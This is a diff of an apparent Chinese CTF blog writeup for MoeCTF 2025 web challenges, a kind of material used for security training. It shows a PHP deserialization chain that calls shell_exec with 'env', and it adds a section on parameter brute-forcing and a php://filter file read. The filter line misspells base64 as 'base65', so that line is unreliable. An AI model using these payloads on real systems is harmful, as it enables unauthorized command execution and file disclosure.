@@ -49,8 +49,10 @@
 <meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E5%BE%A1%E7%A5%9E_1.png">
 <meta property="og:image" content="http://m21in.github.io/images/moectf2025/SSTI1_1.png">
 <meta property="og:image" content="http://m21in.github.io/images/moectf2025/SSTI1_2.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E5%8D%81%E4%B8%80_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E5%8D%81%E4%B8%80_2.png">
 <meta property="article:published_time" content="2025-08-12T10:54:24.000Z">
-<meta property="article:modified_time" content="2025-10-07T03:12:11.651Z">
+<meta property="article:modified_time" content="2025-12-26T12:37:03.770Z">
 <meta property="article:author" content="M21in">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="writeup">
@@ -153,12 +155,12 @@
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">18</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">26</span></a>
 
   </li>
   </ul>
@@ -219,7 +221,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-10-07 11:12:11" itemprop="dateModified" datetime="2025-10-07T11:12:11+08:00">2025-10-07</time>
+                <time title="修改时间：2025-12-26 20:37:03" itemprop="dateModified" datetime="2025-12-26T20:37:03+08:00">2025-12-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -227,7 +229,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
                 </span>
             </span>
 
@@ -366,6 +368,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$personB2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"><span class="variable">$personB2</span>-&gt;id = <span class="variable">$obj</span>;</span><br><span class="line"><span class="variable">$personB2</span>-&gt;name = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$personC1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$personC1</span>-&gt;name = <span class="string">&#x27;shell_exec&#x27;</span>; <span class="comment">// 使用shell_exec函数</span></span><br><span class="line"><span class="variable">$personC1</span>-&gt;id = <span class="variable">$personB2</span>;</span><br><span class="line"><span class="variable">$personC1</span>-&gt;age = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$personA</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$personA</span>-&gt;name = <span class="variable">$personC1</span>;</span><br><span class="line"><span class="variable">$personA</span>-&gt;id = <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line"><span class="variable">$personA</span>-&gt;age = <span class="string">&#x27;env&#x27;</span>; <span class="comment">// 命令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$personA</span>);</span><br></pre></td></tr></table></figure>
 
 <p>环境变量直接查看</p>
+<h1 id="第十一章-千机变·破妄之眼"><a href="#第十一章-千机变·破妄之眼" class="headerlink" title="第十一章 千机变·破妄之眼"></a>第十一章 千机变·破妄之眼</h1><p>爆参数，结果是onqpm，然后访问find.php</p>
+<p><img src="/./images/moectf2025/%E5%8D%81%E4%B8%80_1.png"></p>
+<p>但是没法直接看</p>
+<p><img src="/./images/moectf2025/%E5%8D%81%E4%B8%80_2.png"></p>
+<p>用filter伪协议看</p>
+<p><code>php://filter/read=convert.base65-encode/resource=flag.php</code></p>
 
     </div>
 
@@ -453,7 +461,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">1.</span> <span class="nav-text">web入门指北</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-number">2.</span> <span class="nav-text">神秘的手镯</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">3.</span> <span class="nav-text">初识金曦玄轨</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">4.</span> <span class="nav-text">问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">5.</span> <span class="nav-text">打上门来！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-number">6.</span> <span class="nav-text">天机符阵</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-number">7.</span> <span class="nav-text">玉魄玄关·破妄</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="nav-number">8.</span> <span class="nav-text">昆仑星途</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="nav-number">9.</span> <span class="nav-text">Moe笑传之猜猜爆</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">10.</span> <span class="nav-text">金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-number">11.</span> <span class="nav-text">藏经禁制？玄机初探！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-number">12.</span> <span class="nav-text">灵蛛探穴与阴阳双生符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-number">13.</span> <span class="nav-text">星墟禁制·天机问路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">14.</span> <span class="nav-text">星骸迷阵·神念重构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="nav-number">15.</span> <span class="nav-text">御神关·补天玉碑</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="nav-number">16.</span> <span class="nav-text">天机符阵_revenge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E7%A9%B9%E7%9C%9F%E7%9B%B8%C2%B7%E8%A1%A5%E5%A4%A9%E5%BD%92%E6%BA%90"><span class="nav-number">17.</span> <span class="nav-text">星穹真相·补天归源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="nav-number">18.</span> <span class="nav-text">幽冥血海·幻语心魔</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="nav-number">19.</span> <span class="nav-text">第十九章_revenge</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">1.</span> <span class="nav-text">web入门指北</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-number">2.</span> <span class="nav-text">神秘的手镯</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">3.</span> <span class="nav-text">初识金曦玄轨</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">4.</span> <span class="nav-text">问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">5.</span> <span class="nav-text">打上门来！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-number">6.</span> <span class="nav-text">天机符阵</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-number">7.</span> <span class="nav-text">玉魄玄关·破妄</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="nav-number">8.</span> <span class="nav-text">昆仑星途</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="nav-number">9.</span> <span class="nav-text">Moe笑传之猜猜爆</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">10.</span> <span class="nav-text">金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-number">11.</span> <span class="nav-text">藏经禁制？玄机初探！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-number">12.</span> <span class="nav-text">灵蛛探穴与阴阳双生符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-number">13.</span> <span class="nav-text">星墟禁制·天机问路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">14.</span> <span class="nav-text">星骸迷阵·神念重构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="nav-number">15.</span> <span class="nav-text">御神关·补天玉碑</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="nav-number">16.</span> <span class="nav-text">天机符阵_revenge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E7%A9%B9%E7%9C%9F%E7%9B%B8%C2%B7%E8%A1%A5%E5%A4%A9%E5%BD%92%E6%BA%90"><span class="nav-number">17.</span> <span class="nav-text">星穹真相·补天归源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="nav-number">18.</span> <span class="nav-text">幽冥血海·幻语心魔</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="nav-number">19.</span> <span class="nav-text">第十九章_revenge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="nav-number">20.</span> <span class="nav-text">第十一章 千机变·破妄之眼</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -469,14 +477,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
